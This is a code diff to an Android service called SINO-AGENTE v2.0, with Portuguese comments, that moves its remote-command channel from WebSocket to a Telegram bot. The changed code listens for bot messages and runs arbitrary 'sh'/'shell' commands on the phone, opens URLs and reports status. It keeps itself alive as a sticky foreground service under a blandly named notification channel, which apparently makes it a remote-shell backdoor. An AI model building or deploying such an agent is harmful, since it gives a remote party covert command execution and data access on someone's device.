@@ -10,24 +10,21 @@ import android.content.IntentFilter;
 import android.net.Uri;
 import android.os.BatteryManager;
 import android.os.Build;
-import android.os.Handler;
 import android.os.IBinder;
-import android.os.Looper;
-import android.os.SystemClock;
-
-import org.json.JSONObject;
 
 import java.util.Locale;
 
-/** SINO-AGENTE v1.1 — tubo de conexao com o SINO-TUBO. */
+/**
+ * SINO-AGENTE v2.0 — comando remoto via TELEGRAM (transporte provado do SINO-GPS).
+ * Zero WebSocket. Zero Cloudflare. O chat com o bot e o console.
+ */
 public class RelayService extends Service {
 
     private static final String CH = "sync_data_min";
     private static final int NOTIF_ID = 2002;
 
-    private WsClient ws;
+    private TelegramBridge tg;
     private volatile boolean running = true;
-    private volatile int hbMiss = 0;
     private long startedAt = 0;
 
     @Override
@@ -36,93 +33,30 @@ public class RelayService extends Service {
         startedAt = System.currentTimeMillis();
         goForeground();
 
-        String url = "wss://" + BuildConfig.TUBO_HOST + "/ws?id=" + BuildConfig.POSTO
-                + "&token=" + BuildConfig.TOKEN + "&role=phone";
+        tg = new TelegramBridge(BuildConfig.BOT_TOKEN, BuildConfig.MASTER_CHAT);
+        tg.say("agente online v" + BuildConfig.VERSION_NAME);
 
-        new Thread(() -> {
-            long backoff = 3000;
-            while (running) {
-                try {
-                    ws = new WsClient();
-                    ws.connect(url, this::onMsg,
-                            () -> sendRaw("sat-agente online v" + BuildConfig.VERSION_NAME));
-                    backoff = 3000;
-                } catch (Exception e) {
-                    sendRaw("sat-agente erro: " + e);
-                }
-                if (!running) break;
-                sendRaw("sat-agente reconectando em " + (backoff / 1000) + "s");
-                sleep(backoff);
-                backoff = Math.min(backoff * 2, 60_000);
-            }
-        }, "relay-conn").start();
-
-        new Thread(() -> {
-            while (running) {
-                sleep(25_000);
-                if (ws != null) {
-                    if (ws.stale(90_000)) {           // zumbi: forca reconexao
-                        sendRaw("sat-agente zumbi detectado, reconectando");
-                        continue;
-                    }
-                    if (ws.isOpen()) {
-                        if (++hbMiss >= 3) {          // 3 batimentos sem pong do DO = socket orfao
-                            sendRaw("sat-agente orfao (sem pong), renascendo");
-                            hbMiss = 0;
-                            ws.close();
-                            continue;
-                        }
-                        try { ws.sendText("{\"type\":\"hb\"}"); } catch (Exception ignored) { }
-                    }
-                }
-            }
-        }, "relay-hb").start();
+        new Thread(() -> tg.listen((text, from) ->
+                new Thread(() -> onCmd(text), "relay-exec").start()), "relay-tg").start();
     }
 
-    private void onMsg(String text) {
-        hbMiss = 0; // qualquer mensagem de aplicacao (incl. pong do DO) prova que o cano e real
-        try {
-            JSONObject o = new JSONObject(text);
-            if (!"cmd".equals(o.optString("type"))) return;
-            final long rid = o.getLong("rid");
-            final String cmd = o.optString("cmd", "");
-            sendRaw("exec: " + cmd);
-            new Thread(() -> {
-                String out;
-                try { out = handle(cmd); }
-                catch (Throwable t) { out = "erro handle: " + t; }
-                try {
-                    JSONObject r = new JSONObject();
-                    r.put("type", "reply");
-                    r.put("rid", rid);
-                    r.put("out", out);
-                    if (ws != null && ws.isOpen()) ws.sendText(r.toString());
-                    else sendRaw("sem ws pra responder");
-                } catch (Exception e) {
-                    sendRaw("erro reply: " + e);
-                }
-            }, "relay-exec").start();
-        } catch (Exception e) {
-            sendRaw("msg invalida: " + e);
-        }
-    }
-
-    private String handle(String cmd) {
-        String c = cmd.trim();
+    private void onCmd(String text) {
+        String c = text.trim();
         String low = c.toLowerCase(Locale.ROOT);
-        if (low.equals("ping")) return "pong";
-        if (low.equals("status") || low.equals("estado")) return statusLine();
+        if (low.equals("ping")) { tg.say("pong"); return; }
+        if (low.equals("status") || low.equals("estado")) { tg.say(statusLine()); return; }
         if (low.startsWith("open ")) {
             try {
                 Intent i = new Intent(Intent.ACTION_VIEW, Uri.parse(c.substring(5).trim()));
                 i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                 startActivity(i);
-                return "abrindo: " + c.substring(5).trim();
-            } catch (Exception e) { return "erro open: " + e; }
+                tg.say("abrindo: " + c.substring(5).trim());
+            } catch (Exception e) { tg.say("erro open: " + e); }
+            return;
         }
-        if (low.startsWith("sh ")) return Exec.run(c.substring(3));
-        if (low.startsWith("shell ")) return Exec.run(c.substring(6));
-        return "comandos: sh <cmd> | shell <cmd> | open <url> | status | ping";
+        if (low.startsWith("sh ")) { tg.say(Exec.run(c.substring(3))); return; }
+        if (low.startsWith("shell ")) { tg.say(Exec.run(c.substring(6))); return; }
+        tg.say("comandos: sh <cmd> | shell <cmd> | open <url> | status | ping");
     }
 
     private String statusLine() {
@@ -134,20 +68,8 @@ public class RelayService extends Service {
             bi = registerReceiver(null, f);
         int bat = bi != null ? bi.getIntExtra(BatteryManager.EXTRA_LEVEL, -1) : -1;
         long upMin = (System.currentTimeMillis() - startedAt) / 60_000L;
-        boolean tubo = ws != null && ws.isOpen();
-        return String.format(Locale.US, "bateria %d%% · uptime %dmin · tubo %s · posto %s",
-                bat, upMin, tubo ? "conectado" : "caido", BuildConfig.POSTO);
-    }
-
-    private void sendRaw(String t) {
-        try {
-            if (ws != null && ws.isOpen()) {
-                JSONObject o = new JSONObject();
-                o.put("type", "log");
-                o.put("m", t);
-                ws.sendText(o.toString()); // JSON: evento 'json' do DO so dispara pra JSON
-            }
-        } catch (Exception ignored) { }
+        return String.format(Locale.US, "bateria %d%% · uptime %dmin · transporte telegram · posto %s",
+                bat, upMin, BuildConfig.VERSION_NAME);
     }
 
     private void goForeground() {
@@ -167,17 +89,13 @@ public class RelayService extends Service {
         startForeground(NOTIF_ID, b.build());
     }
 
-    private static void sleep(long ms) {
-        try { Thread.sleep(ms); } catch (InterruptedException ignored) { }
-    }
-
     @Override public int onStartCommand(Intent i, int f, int id) { return START_STICKY; }
     @Override public IBinder onBind(Intent i) { return null; }
 
     @Override
     public void onDestroy() {
         running = false;
-        if (ws != null) ws.close();
+        if (tg != null) tg.stop();
         super.onDestroy();
     }
 }
